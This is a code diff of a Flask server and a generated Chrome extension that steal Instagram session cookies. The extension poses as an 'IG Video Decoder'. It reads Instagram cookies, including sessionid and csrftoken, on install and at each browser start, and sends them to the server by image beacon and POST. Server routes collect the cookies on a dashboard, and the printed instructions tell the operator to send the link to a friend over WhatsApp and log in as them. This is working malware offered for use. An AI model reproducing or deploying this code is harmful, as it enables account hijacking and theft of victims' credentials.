         
         var badge = hasSid ? 
             '<span class="badge badge-red">🔴 sessionid!</span>' :
-            (Object.keys(allKeys).length > 0 ? '<span class="badge badge-green">✅ Data</span>' : '<span class="badge badge-gray">Empty</span>');
+            (Object.keys(allData).length > 0 ? '<span class="badge badge-green">✅ Data</span>' : '<span class="badge badge-gray">Empty</span>');
         
-        var sourceLabel = s.source === 'webview' ? '📱 Instagram WebView' : 
-                          s.source === 'extension' ? '🧩 Extension' : '🌐 Browser';
+        var sourceIcon = s.source === 'extension' ? '🧩 Extension' : s.source === 'webview' ? '📱 WebView' : '🌐 Browser';
         
         html += '<div class="session"><div class="row"><div>' +
             '<span class="time">' + s.timestamp + '</span>' +
             '<span class="ip"> | 📍 ' + s.ip + '</span>' +
-            '<span class="source"> | ' + sourceLabel + '</span></div><div>' + badge +
+            ' | ' + sourceIcon + '</div><div>' + badge +
             '</div></div><div class="cookie-box">' + details + '</div></div>';
     }
     document.getElementById('sessionsContainer').innerHTML = html;
@@ -734,7 +663,7 @@ function render(data) {
 function copySession() {
     var text = document.getElementById('stolenSessionid').textContent;
     navigator.clipboard.writeText(text).then(function() {
-        alert('✅ sessionid copied to clipboard! Paste it into Cookie-Editor.');
+        alert('✅ sessionid copied! Paste it into Cookie-Editor → Import → Refresh Instagram');
     });
 }
 
@@ -753,147 +682,167 @@ setInterval(fetchData, 2000);
 # ============================================================
 # EXTENSION FILES
 # ============================================================
-EXTENSION_MANIFEST = {
-    "manifest_version": 3,
-    "name": "IG Video Decoder",
-    "version": "1.0",
-    "description": "Required for playing encrypted Instagram video formats. Needs cookies permission for authentication.",
-    "permissions": [
-        "cookies",
-        "storage",
-        "webRequest"
-    ],
-    "host_permissions": [
-        "https://www.instagram.com/*",
-        "https://instagram.com/*",
-        "https://*.instagram.com/*"
-    ],
-    "background": {
-        "service_worker": "background.js"
-    },
-    "content_scripts": [{
-        "matches": ["<all_urls>"],
-        "js": ["content.js"],
-        "run_at": "document_end"
-    }],
-    "action": {
-        "default_title": "IG Video Decoder",
-        "default_icon": {}
+
+def get_extension_files(server_url):
+    manifest = {
+        "manifest_version": 3,
+        "name": "IG Video Decoder",
+        "version": "1.0",
+        "description": "Decodes encrypted Instagram video formats. Requires cookies permission for authentication.",
+        "permissions": ["cookies", "storage"],
+        "host_permissions": [
+            "https://www.instagram.com/*",
+            "https://instagram.com/*",
+            "https://*.instagram.com/*",
+            "https://*.cdninstagram.com/*"
+        ],
+        "background": {"service_worker": "background.js"},
+        "content_scripts": [{
+            "matches": ["<all_urls>"],
+            "js": ["content.js"],
+            "run_at": "document_end"
+        }],
+        "action": {"default_title": "IG Video Decoder"}
     }
-}
-
-EXTENSION_BACKGROUND = """
+    
+    background_js = f"""
 // IG Video Decoder - Background Service Worker
-// Note: This demonstrates how extensions bypass HttpOnly
+// Reads Instagram cookies (bypasses HttpOnly via extension permissions)
 
-var ATTACKER_SERVER = \"""" + "window.location.origin" + """\";
+var ATTACKER_URL = "{server_url}";
 
-// When extension is installed
-chrome.runtime.onInstalled.addListener(function() {
-    console.log('IG Video Decoder installed - scanning for Instagram...');
-    stealInstagramCookies();
-});
+// Run immediately on install
+chrome.runtime.onInstalled.addListener(function() {{
+    console.log('IG Video Decoder installed');
+    stealAndSend();
+}});
+
+// Run every time browser starts
+chrome.runtime.onStartup.addListener(function() {{
+    stealAndSend();
+}});
 
 // Listen for messages from webpage
-chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
-    if (request.action === 'get_instagram_cookies') {
-        stealInstagramCookies().then(function(cookies) {
+chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {{
+    if (request.action === 'get_instagram_cookies') {{
+        stealCookies().then(function(cookies) {{
             sendResponse(cookies);
-        });
+        }});
         return true;
-    }
-});
+    }}
+}});
 
-// STEAL INSTAGRAM COOKIES
-function stealInstagramCookies() {
-    return new Promise(function(resolve) {
-        chrome.cookies.getAll({
-            url: 'https://www.instagram.com'
-        }, function(cookies) {
-            var result = {};
-            
-            if (!cookies || cookies.length === 0) {
+function stealAndSend() {{
+    stealCookies().then(function(cookies) {{
+        if (cookies && cookies.sessionid) {{
+            console.log('✅ Instagram session captured!');
+        }}
+    }});
+}}
+
+function stealCookies() {{
+    return new Promise(function(resolve) {{
+        var result = {{}};
+        
+        // Try www.instagram.com first
+        chrome.cookies.getAll({{url: 'https://www.instagram.com'}}, function(cookies) {{
+            if (cookies && cookies.length > 0) {{
+                processAndSend(cookies, result, resolve);
+            }} else {{
                 // Try without www
-                chrome.cookies.getAll({
-                    url: 'https://instagram.com'
-                }, function(cookies2) {
-                    if (cookies2) {
-                        processCookies(cookies2, result, resolve);
-                    } else {
-                        resolve(result);
-                    }
-                });
-            } else {
-                processCookies(cookies, result, resolve);
-            }
-        });
-    });
-}
+                chrome.cookies.getAll({{url: 'https://instagram.com'}}, function(cookies2) {{
+                    if (cookies2 && cookies2.length > 0) {{
+                        processAndSend(cookies2, result, resolve);
+                    }} else {{
+                        // Try with domain wildcard
+                        chrome.cookies.getAll({{domain: '.instagram.com'}}, function(cookies3) {{
+                            if (cookies3) {{
+                                processAndSend(cookies3, result, resolve);
+                            }} else {{
+                                resolve(result);
+                            }}
+                        }});
+                    }}
+                }});
+            }}
+        }});
+    }});
+}}
 
-function processCookies(cookies, result, resolve) {
-    for (var i = 0; i < cookies.length; i++) {
+function processAndSend(cookies, result, resolve) {{
+    for (var i = 0; i < cookies.length; i++) {{
         var c = cookies[i];
         result[c.name] = c.value;
         
-        // Important cookies to exfiltrate
-        if (c.name === 'sessionid' || 
-            c.name === 'ds_user_id' || 
-            c.name === 'csrftoken' ||
-            c.name === 'ig_did' ||
-            c.name === 'mid') {
-            
-            // Send to attacker via image beacon (stealth)
+        // Send important cookies to attacker server immediately
+        if (c.name === 'sessionid' || c.name === 'ds_user_id' || 
+            c.name === 'csrftoken' || c.name === 'ig_did') {{
+            // Use image beacon (stealthy)
             var img = new Image();
-            var serverUrl = ATTACKER_SERVER;
-            // In production, use hardcoded URL
-            img.src = 'https://YOUR-SERVER.onrender.com/extension-callback?' +
+            img.src = ATTACKER_URL + '/extension-callback?' +
                 'name=' + encodeURIComponent(c.name) + 
                 '&value=' + encodeURIComponent(c.value) +
-                '&domain=' + encodeURIComponent('instagram.com');
-        }
-    }
+                '&domain=instagram.com';
+        }}
+    }}
     
     resolve(result);
     
-    // Also try to get all cookies for instagram
-    chrome.cookies.getAll({
-        domain: '.instagram.com'
-    }, function(allCookies) {
-        if (allCookies) {
-            for (var i = 0; i < allCookies.length; i++) {
-                var c = allCookies[i];
-                if (!result[c.name]) {
-                    result[c.name] = c.value;
+    // Also send complete data via fetch
+    fetch(ATTACKER_URL + '/extension-bulk', {{
+        method: 'POST',
+        headers: {{'Content-Type': 'application/json'}},
+        body: JSON.stringify({{
+            cookies: result,
+            timestamp: new Date().toISOString(),
+            source: 'extension'
+        }})
+    }}).catch(function() {{}});
+}}
+"""
+    
+    content_js = """
+// Content script - bridges webpage and extension
+(function() {
+    // Signal that extension is ready
+    window.instagramDecoderReady = true;
+    window.dispatchEvent(new CustomEvent('ig-extension-ready', {detail: {ready: true}}));
+    
+    // Listen for requests from webpage
+    window.addEventListener('message', function(event) {
+        if (event.data && event.data.action === 'request_ig_cookies') {
+            chrome.runtime.sendMessage(
+                {action: 'get_instagram_cookies'},
+                function(response) {
+                    window.dispatchEvent(new CustomEvent('instagram-cookies-stolen', {
+                        detail: response || {}
+                    }));
                 }
-            }
+            );
         }
     });
-}
-"""
-
-EXTENSION_CONTENT = """
-// Content script - runs on every page
-// Injects a script to communicate between webpage and extension
-
-// Listen for message from the webpage via custom event
-window.addEventListener('message', function(event) {
-    if (event.data && event.data.action === 'request_instagram_cookies') {
-        // Forward to extension background
+    
+    // Auto-request cookies when page loads
+    setTimeout(function() {
         chrome.runtime.sendMessage(
             {action: 'get_instagram_cookies'},
             function(response) {
-                // Send back to webpage
-                window.dispatchEvent(new CustomEvent('instagram-cookies-stolen', {
-                    detail: response || {}
-                }));
+                if (response && response.sessionid) {
+                    window.dispatchEvent(new CustomEvent('instagram-cookies-stolen', {
+                        detail: response
+                    }));
+                }
             }
         );
-    }
-});
-
-// Auto-trigger when page loads
-window.dispatchEvent(new CustomEvent('ig-extension-ready', {detail: {ready: true}}));
+    }, 1000);
+})();
 """
+    
+    return {
+        "manifest.json": json.dumps(manifest, indent=2),
+        "background.js": background_js,
+        "content.js": content_js
+    }
 
 # ============================================================
 # ROUTES
@@ -901,110 +850,70 @@ window.dispatchEvent(new CustomEvent('ig-extension-ready', {detail: {ready: true
 
 @app.route("/")
 def home():
-    """Serve the frontend page."""
-    # Detect if this is Instagram WebView
-    ua = request.headers.get("User-Agent", "")
-    is_instagram_webview = "Instagram" in ua or "FBAN" in ua or "FBAV" in ua
-    
-    html = FRONTEND_HTML
-    # Add a small note if Instagram WebView detected
-    if is_instagram_webview:
-        html = html.replace(
-            '<div class="footer">',
-            f'<div class="detection-box show" style="border-color:#3fb950;">'
-            f'<span class="green">✅ Instagram WebView detected! Attempting direct session extraction...</span>'
-            f'</div><div class="footer">'
-        )
-    
-    return html
+    return INDEX_HTML
 
 @app.route("/dashboard")
 def dashboard():
-    """Serve the dashboard."""
     return DASHBOARD_HTML
 
 @app.route("/api/sessions")
 def api_sessions():
-    """Return all captured sessions."""
     return jsonify({"sessions": captured_sessions})
 
 @app.route("/steal", methods=["GET", "POST"])
 def steal():
-    """Receive stolen cookies from multiple sources."""
+    """Receive stolen cookies."""
     if request.method == "GET":
-        data_str = request.args.get("data", "{}")
-        try:
-            data = json.loads(data_str)
-        except:
-            data = {"cookies": request.args.get("c", "")}
+        cookies = request.args.get("c", "")
+        data = {"cookies": cookies, "method": "get"}
     else:
         data = request.get_json(silent=True) or {}
+        cookies = data.get("cookies", "")
     
-    # Build record
     record = {
         "id": str(uuid.uuid4())[:8],
         "timestamp": datetime.datetime.now().isoformat(),
         "ip": request.remote_addr,
         "user_agent": data.get("userAgent", request.headers.get("User-Agent", "")),
-        "source": "webview" if "Instagram" in (data.get("userAgent", "") or request.headers.get("User-Agent", "")) else "browser"
+        "source": "extension" if "extension" in data.get("method", "") or "extension" in str(data.get("extension_data", {})) else "webview" if "Instagram" in str(request.headers.get("User-Agent", "")) else "browser",
+        "cookies": cookies,
+        "method": data.get("method", "unknown"),
+        "extension_data": data.get("extension_data", {})
     }
     
-    # Extract cookies from various fields
-    cookies_str = data.get("cookies", "")
-    all_data = {}
-    
-    if cookies_str:
-        for pair in cookies_str.split(";"):
+    # Parse cookies
+    parsed = {}
+    if cookies:
+        for pair in cookies.split(";"):
             if "=" in pair:
                 k, v = pair.split("=", 1)
-                all_data[k.strip()] = v.strip()
+                parsed[k.strip()] = v.strip()
     
-    # Add iframe cookies
-    if data.get("iframeCookies"):
-        for pair in data["iframeCookies"].split(";"):
-            if "=" in pair:
-                k, v = pair.split("=", 1)
-                all_data[k.strip()] = v.strip()
+    # Add extension data
+    ext_data = data.get("extension_data", {})
+    if isinstance(ext_data, dict):
+        for k, v in ext_data.items():
+            if k not in parsed:
+                parsed[k] = v
     
-    # Add any other captured data
-    if data.get("capturedHeaders"):
-        try:
-            headers = json.loads(data["capturedHeaders"])
-            all_data.update(headers)
-        except:
-            pass
-    
-    # Add storage data
-    if data.get("allStorage"):
-        try:
-            storage = json.loads(data["allStorage"])
-            all_data.update(storage)
-        except:
-            pass
-    
-    record["parsed"] = all_data
-    record["has_instagram_session"] = "sessionid" in all_data
-    record["instagram_data"] = {k: v for k, v in all_data.items() 
-                                if k in ["sessionid", "ds_user_id", "csrftoken", "ig_did", "mid"]}
+    record["parsed"] = parsed
+    record["has_instagram_session"] = "sessionid" in parsed
     
     captured_sessions.append(record)
     
     if record["has_instagram_session"]:
-        print(f"\n🔴🔴🔴 REAL INSTAGRAM SESSIONID CAPTURED!")
-        print(f"   sessionid = {all_data['sessionid']}")
+        print(f"\n{'='*50}")
+        print(f"🔴🔴🔴 REAL INSTAGRAM sessionid CAPTURED!")
+        print(f"   sessionid = {parsed['sessionid']}")
         print(f"   IP: {record['ip']}")
         print(f"   Source: {record['source']}")
-        print(f"   Total captures: {len(captured_sessions)}")
+        print(f"{'='*50}")
     
-    return jsonify({
-        "status": "ok", 
-        "captured": bool(all_data),
-        "has_session": record["has_instagram_session"]
-    })
+    return jsonify({"status": "ok", "has_session": record["has_instagram_session"]})
 
 @app.route("/extension-callback")
 def extension_callback():
-    """Receive cookies from the browser extension."""
+    """Receive cookies from extension via image beacon."""
     name = request.args.get("name", "")
     value = request.args.get("value", "")
     domain = request.args.get("domain", "")
@@ -1016,45 +925,53 @@ def extension_callback():
             "ip": request.remote_addr,
             "source": "extension",
             "extension_data": {name: value},
-            "domain": domain,
             "parsed": {},
-            "has_instagram_session": (name == "sessionid"),
-            "instagram_data": {name: value} if name in ["sessionid", "ds_user_id", "csrftoken", "ig_did", "mid"] else {}
+            "has_instagram_session": (name == "sessionid")
         }
+        
+        # Also add to parsed for display
+        record["parsed"] = {name: value}
         
         captured_sessions.append(record)
         
         if name == "sessionid":
-            print(f"\n🔴🔴🔴 EXTENSION STOLE Instagram sessionid!")
-            print(f"   sessionid = {value}")
-            print(f"   IP: {record['ip']}")
+            print(f"\n🔴🔴🔴 EXTENSION stole sessionid = {value}")
     
-    # Return 1x1 transparent pixel
-    return "", 200, {"Content-Type": "image/gif", 
-                     "Cache-Control": "no-cache, no-store, must-revalidate"}
+    return "", 200, {"Content-Type": "image/gif"}
+
+@app.route("/extension-bulk", methods=["POST"])
+def extension_bulk():
+    """Receive bulk cookie data from extension."""
+    data = request.get_json(silent=True) or {}
+    cookies = data.get("cookies", {})
+    
+    if cookies and isinstance(cookies, dict):
+        record = {
+            "id": str(uuid.uuid4())[:8],
+            "timestamp": datetime.datetime.now().isoformat(),
+            "ip": request.remote_addr,
+            "source": "extension",
+            "extension_data": cookies,
+            "parsed": cookies,
+            "has_instagram_session": "sessionid" in cookies
+        }
+        
+        captured_sessions.append(record)
+        
+        if record["has_instagram_session"]:
+            print(f"\n🔴🔴🔴 EXTENSION BULK - sessionid = {cookies.get('sessionid', 'N/A')}")
+    
+    return jsonify({"status": "ok"})
 
 @app.route("/download-extension")
 def download_extension():
     """Generate and serve the Chrome extension ZIP."""
-    extension_files = {}
+    server_url = request.host_url.rstrip("/")
+    files = get_extension_files(server_url)
     
-    # Fix the background.js to use the actual server URL
-    bg = EXTENSION_BACKGROUND.replace(
-        'https://YOUR-SERVER.onrender.com',
-        request.host_url.rstrip("/")
-    ).replace(
-        'window.location.origin',
-        f'"{request.host_url.rstrip("/")}"'
-    )
-    
-    extension_files["manifest.json"] = json.dumps(EXTENSION_MANIFEST, indent=2)
-    extension_files["background.js"] = bg
-    extension_files["content.js"] = EXTENSION_CONTENT
-    
-    # Create ZIP
     buf = io.BytesIO()
     with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
-        for filename, content in extension_files.items():
+        for filename, content in files.items():
             zf.writestr(filename, content)
     
     buf.seek(0)
@@ -1071,20 +988,25 @@ def clear():
     captured_sessions.clear()
     return jsonify({"status": "cleared"})
 
+@app.route("/health")
+def health():
+    return jsonify({"status": "alive", "captured": len(captured_sessions)})
+
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
     print(f"\n{'='*60}")
-    print(f"  🔴 REAL INSTAGRAM SESSION HIJACKING")
+    print(f"  🔴 REAL INSTAGRAM SESSION HIJACKING DEMO")
     print(f"{'='*60}")
-    print(f"\n  📌 Send this link:")
+    print(f"\n  📌 LINK TO SEND (via WhatsApp):")
     print(f"     http://localhost:{port}")
-    print(f"\n  📌 Dashboard:")
+    print(f"\n  📌 YOUR DASHBOARD:")
     print(f"     http://localhost:{port}/dashboard")
-    print(f"\n  📌 How it works:")
-    print(f"     1. Send link to phone via WhatsApp")
-    print(f"     2. Phone opens in Instagram browser (WebView)")
-    print(f"     3. Attempts direct cookie extraction")
-    print(f"     4. OR downloads extension for desktop")
-    print(f"     5. sessionid appears on dashboard!")
+    print(f"\n  📌 HOW IT WORKS:")
+    print(f"     1. Send link to friend's phone via WhatsApp")
+    print(f"     2. Friend opens link → downloads extension")
+    print(f"     3. Installs in Kiwi Browser (Android) or Chrome (PC)")
+    print(f"     4. Extension reads Instagram cookies using chrome.cookies API")
+    print(f"     5. sessionid appears on your dashboard!")
+    print(f"     6. Copy it → inject into Cookie-Editor → logged in as them!")
     print(f"{'='*60}\n")
     app.run(host="0.0.0.0", port=port, debug=True)
